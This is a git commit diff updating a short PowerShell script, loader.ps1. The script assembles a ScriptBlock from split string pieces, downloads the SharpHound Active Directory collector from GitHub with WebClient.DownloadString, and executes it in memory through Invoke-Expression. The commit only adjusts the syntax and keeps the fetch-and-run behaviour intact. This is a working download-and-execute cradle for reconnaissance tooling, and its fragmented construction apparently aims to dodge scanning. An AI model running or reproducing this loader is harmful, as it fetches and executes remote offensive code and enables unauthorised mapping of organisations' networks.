f208d848101665439acb2b04c27910f4c67dd5bd
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 19:41:37 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,5 +1,6 @@
 $pre = '[ScriptBlock]::Create('
-$mid = '" . (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'')"'
+$mid = '" . ([System.Net.WebClient]::new()).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'')"'
 $post = ')'
-$sb = Invoke-Expression ($pre + $mid + $post)
+$joined = $pre + $mid + $post
+$sb = Invoke-Expression $joined
 & $sb
